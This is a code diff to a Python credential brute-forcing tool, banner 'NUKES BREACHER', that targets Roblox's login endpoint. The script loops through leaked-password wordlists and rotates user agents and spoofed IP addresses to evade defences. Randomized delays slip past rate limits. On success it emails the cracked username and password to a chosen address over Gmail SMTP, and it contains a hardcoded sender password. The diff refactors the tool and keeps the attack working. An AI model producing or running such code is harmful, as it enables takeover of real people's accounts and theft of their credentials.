@@ -28,18 +28,17 @@ ip_addresses = [
 rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
 
 ascii_art = """
-   
-  _   _   _    _   _  __  ______    _____     ____    _____    ______               _____   _    _   ______   _____              __ 
- | \ | | | |  | | | |/ / |  ____|  / ____|   |  _ \  |  __ \  |  ____|     /\      / ____| | |  | | |  ____| |  __ \            /_ |
- |  \| | | |  | | | ' /  | |__    | (___     | |_) | | |__) | | |__       /  \    | |      | |__| | | |__    | |__) |   __   __  | |
- | . ` | | |  | | |  <   |  __|    \___ \    |  _ <  |  _  /  |  __|     / /\ \   | |      |  __  | |  __|   |  _  /    \ \ / /  | |
- | |\  | | |__| | | . \  | |____   ____) |   | |_) | | | \ \  | |____   / ____ \  | |____  | |  | | | |____  | | \ \     \ V /   | |
- |_| \_|  \____/  |_|\_\ |______| |_____/    |____/  |_|  \_\ |______| /_/    \_\  \_____| |_|  |_| |______| |_|  \_\     \_/    |_|
+   _   _   _    _   _  __  ______    _____     ____    _____    ______               _____   _    _   ______   _____              __ 
+  | \ | | | |  | | | |/ / |  ____|  / ____|   |  _ \  |  __ \  |  ____|     /\      / ____| | |  | | |  ____| |  __ \            /_ |
+  |  \| | | |  | | | ' /  | |__    | (___     | |_) | | |__) | | |__       /  \    | |      | |__| | | |__    | |__) |   __   __  | |
+  | . ` | | |  | | |  <   |  __|    \___ \    |  _ <  |  _  /  |  __|     / /\ \   | |      |  __  | |  __|   |  _  /    \ \ / /  | |
+  | |\  | | |__| | | . \  | |____   ____) |   | |_) | | | \ \  | |____   / ____ \  | |____  | |  | | | |____  | | \ \     \ V /   | |
+  |_| \_|  \____/  |_|\_\ |______| |_____/    |____/  |_|  \_\ |______| /_/    \_\  \_____| |_|  |_| |______| |_|  \_\     \_/    |_|
                                                                                                                                     
                                                                                                                                     
    __  _____            _       _                               _   _   _     _                  __                                 
   / / |  __ \          | |     | |                             | | (_) | |   (_)                 \ \                                
- | |  | |__) |   ___   | |__   | |   ___   __  __     ___    __| |  _  | |_   _    ___    _ __    | |                               
+ | |  | |__) |   ___   | |__   | |   ___   __  __     ___    __| |  _  | |_  _    ___    _ __    | |                               
  | |  |  _  /   / _ \  | '_ \  | |  / _ \  \ \/ /    / _ \  / _` | | | | __| | |  / _ \  | '_ \   | |                               
  | |  | | \ \  | (_) | | |_) | | | | (_) |  >  <    |  __/ | (_| | | | | |_  | | | (_) | | | | |  | |                               
  | |  |_|  \_\  \___/  |_.__/  |_|  \___/  /_/\_\    \___|  \__,_| |_|  \__| |_|  \___/  |_| |_|  | |                               
@@ -69,7 +68,7 @@ def send_email(success, username, password, receiver_email):
     try:
         with smtplib.SMTP('smtp.gmail.com', 587) as server:
             server.starttls()
-            server.login(sender_email, 'breacherbot!1')
+            server.login(sender_email, 'breacherbot!1')  # Use app password for Gmail
             text = msg.as_string()
             server.sendmail(sender_email, receiver_email, text)
         print(f"\n[INFO] Email sent to {receiver_email}")
@@ -77,9 +76,13 @@ def send_email(success, username, password, receiver_email):
         print(f"[ERROR] Failed to send email: {e}")
 
 def read_passwords(file_path):
-    with open(file_path, 'r') as file:
-        passwords = file.readlines()
-    return [password.strip() for password in passwords]
+    try:
+        with open(file_path, 'r') as file:
+            passwords = file.readlines()
+        return [password.strip() for password in passwords]
+    except Exception as e:
+        print(f"[ERROR] Failed to read password file {file_path}: {e}")
+        return []
 
 def attempt_login(username, password, user_agent, ip_address, token=None, cookie=None):
     url = 'https://www.roblox.com/newlogin'
@@ -104,7 +107,11 @@ def attempt_login(username, password, user_agent, ip_address, token=None, cookie
 
     try:
         response = requests.post(url, headers=headers, data=data, timeout=10)
-        return response
+        if response.status_code == 200:
+            return response
+        else:
+            print(f"[ERROR] Login failed with status code: {response.status_code}")
+            return None
     except requests.RequestException as e:
         print(f"[ERROR] Request failed: {e}")
         return None
@@ -146,34 +153,35 @@ def print_box(title, content, stats=None, response_code=None, response_header=No
         sys.stdout.write(f"Response Header: {response_header}\n")
     sys.stdout.write(f"{Fore.CYAN}==========================================\n")
 
-def prompt_user():
-    print(Fore.YELLOW + "Choose an option:")
-    print(Fore.GREEN + "1. Use system defined delay")
-    print(Fore.RED + "2. Define custom delay per attempt")
-    choice = input(Fore.CYAN + "Enter your choice (1/2): ")
-    if choice == '2':
-        delay = float(input(Fore.CYAN + "Enter delay in seconds (between 1-5): "))
-        if delay < 1 or delay > 5:
-            print(Fore.RED + "Invalid input. Using system defined delay.")
-            return True
-        elif delay >= 5:
-            print(Fore.RED + "Are you sure you want to go this fast? The server may rate-limit requests.")
-            confirmation = input("1. Yes  2. No: ")
-            if confirmation == '1':
-                return False
-            else:
-                return True
-        else:
-            return False
-    return True
+def prompt_user_for_username():
+    print(Fore.YELLOW + "Enter the username (Email or Phone Number):")
+    return input(Fore.CYAN + "Username: ")
+
+def prompt_user_for_email_updates():
+    print(Fore.YELLOW + "Enter the email address to receive notifications:")
+    return input(Fore.CYAN + "Email Address: ")
 
 def check_delay_customization():
     while True:
-        choice = prompt_user()
-        if choice:
-            return True
-        else:
-            print(Fore.RED + "Custom delay too high. You are proceeding at your own risk.")
+        print(Fore.YELLOW + "Choose an option:")
+        print(Fore.GREEN + "1. Use system-defined delay")
+        print(Fore.RED + "2. Define custom delay per attempt")
+        choice = input(Fore.CYAN + "Enter your choice (1/2): ")
+        if choice == '2':
+            delay = float(input(Fore.CYAN + "Enter delay in seconds (between 1-5): "))
+            if delay < 1 or delay > 5:
+                print(Fore.RED + "Invalid input. Using system defined delay.")
+                return True
+            elif delay >= 5:
+                print(Fore.RED + "Are you sure you want to go this fast? The server may rate-limit requests.")
+                confirmation = input("1. Yes  2. No: ")
+                if confirmation == '1':
+                    return False
+                else:
+                    return True
+            else:
+                return False
+    return True
 
 def signal_handler(sig, frame):
     print("\n[INFO] Process interrupted. Exiting safely...")
@@ -181,7 +189,10 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-def brute_force(username, password_files, token=None, cookie=None, email_updates=None, randomize_rate=True):
+def brute_force():
+    username = prompt_user_for_username()
+    email_updates = prompt_user_for_email_updates()
+    
     total_attempts = 0
     start_time = time.time()
     print_loading_screen()
@@ -189,53 +200,32 @@ def brute_force(username, password_files, token=None, cookie=None, email_updates
     print_box("PASSWORD GUESS", "")
     print_box("LOGGING", "")
 
-    for password_file in password_files:
-        passwords = read_passwords(password_file)
-        if not passwords:
-            print(f"[ERROR] No passwords found in {password_file}")
-            continue
+    passwords = read_passwords('fortinet-2021_passwords.txt')
+    if not passwords:
+        print("[ERROR] No passwords found in fortinet-2021_passwords.txt")
+        return
 
-        for password in passwords:
-            total_attempts += 1
-            user_agent = random.choice(user_agents)
-            ip_address = random.choice(ip_addresses)
+    for password in passwords:
+        total_attempts += 1
+        user_agent = random.choice(user_agents)
+        ip_address = random.choice(ip_addresses)
 
-            response = attempt_login(username, password, user_agent, ip_address, token, cookie)
-            success = "Success" if response and response.status_code == 200 else "Failure"
-            
-            print_box(f"Current Password Guess: {password}", "", f"Success: {success}", response_code=response.status_code if response else "N/A", response_header=response.headers if response else "N/A")
-            log_attempt(username, password, success, retries=total_attempts)
+        response = attempt_login(username, password, user_agent, ip_address)
 
-            if success == "Success":
-                print(f"\n{Fore.GREEN}SUCCESS: {username} - {password}")
-                if email_updates:
-                    send_email(success, username, password, email_updates)
-                break
+        if response and response.status_code == 200:
+            success = f"Success: Username: {username}, Password: {password}"
+            print(Fore.GREEN + f"[SUCCESS] {success}")
+            send_email(success, username, password, email_updates)
+            log_attempt(username, password, success)
+            return
 
-            if total_attempts % 50 == 0:
-                track_passwords_per_minute(start_time, total_attempts)
+        if total_attempts % 10 == 0:
+            track_passwords_per_minute(start_time, total_attempts)
+            estimate_time_left(total_attempts, passwords, start_time)
 
-            if total_attempts % 500 == 0:
-                estimate_time_left(total_attempts, password_files, start_time)
+        time.sleep(random.uniform(1, 3))
 
-            time.sleep(1 if randomize_rate else 0.5)
-        else:
-            continue
-        break
+    print(Fore.RED + "[ERROR] Failed to find password after attempting all passwords.")
+    log_attempt(username, "", "Failed", total_attempts)
 
-if __name__ == "__main__":
-    print(ascii_art)
-    username = input("Enter a username, email address, or phone number: ")
-    token = input("Enter Bearer Token (if applicable, press Enter to skip): ")
-    cookie = input("Enter Cookie (if applicable, press Enter to skip): ")
-
-    email_choice = input("Do you want email updates? (midway/end/none): ").lower()
-    email_updates = None
-    if email_choice in ['midway', 'end']:
-        email_updates = input("Enter your email to receive notifications: ")
-
-    password_files = ['darkweb2017-top10000.txt', 'fortinet-2021_passwords.txt']
-
-    randomize_rate = check_delay_customization()
-
-    brute_force(username, password_files, token if token else None, cookie if cookie else None, email_updates)
+brute_force()
